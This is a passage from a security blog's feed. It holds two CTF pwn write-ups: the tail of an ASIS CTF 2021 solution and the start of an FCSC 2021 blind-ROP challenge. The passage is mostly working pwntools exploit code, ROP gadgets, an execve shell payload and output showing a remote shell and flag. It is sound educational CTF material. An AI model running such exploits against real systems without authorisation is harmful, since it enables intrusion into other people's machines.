<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 10010: Done
/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">b* 0x402036
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span>
<span class="c1"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span>

<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/ASIS-CTF" term="ASIS-CTF" label="ASIS CTF" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/oob-write" term="oob-write" label="oob write" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[FCSC 2021 - pwn] Blind Date]]></title>
            <link href="https://nasm.re/posts/blindate/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/blindate/</id>
            
            <published>2021-05-03T00:00:00+00:00</published>
            <updated>2021-05-03T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="blind-date-489-pts">
        Blind Date (489 pts)
        <a data-clipboard-text="https://nasm.re/posts/blindate/#blind-date-489-pts" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Blind Date (489 pts)" href="#blind-date-489-pts">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<blockquote>
<p>Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu&rsquo;elle n&rsquo;est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n&rsquo;ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service.</p>
</blockquote>
<blockquote>
<p>nc challenges2.france-cybersecurity-challenge.fr 4008</p>
</blockquote>
<p>Blind Date is a blind rop challenge I did during the <a
  class="gblog-markdown__link"
  href="https://www.france-cybersecurity-challenge.fr"
  
  >FCSC event</a
>.
So, no source code is provided, we juste have a netcat to which we can interact.</p>
<p>To solve this challenge I juste read carefully <a
  class="gblog-markdown__link"
  href="https://www.scs.stanford.edu/brop/bittau-brop.pdf"
  
  >this paper</a
> and applied one per one the techniques described.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="find-the-right-offset">
        Find the right offset
        <a data-clipboard-text="https://nasm.re/posts/blindate/#find-the-right-offset" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Find the right offset" href="#find-the-right-offset">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4008</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jmp</span><span class="p">(</span><span class="n">av</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">av</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">5.0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span>

<span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">find_padding</span><span class="p">()))</span>
</code></pre></div><p>It&rsquo;s basically sending checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
<pre tabindex="0"><code>$ ./solve.py
[*] sending: b'\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n'
[*] sending: b'\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b&quot;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'\xad\xe9\x7fBye!\n&quot;
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n'
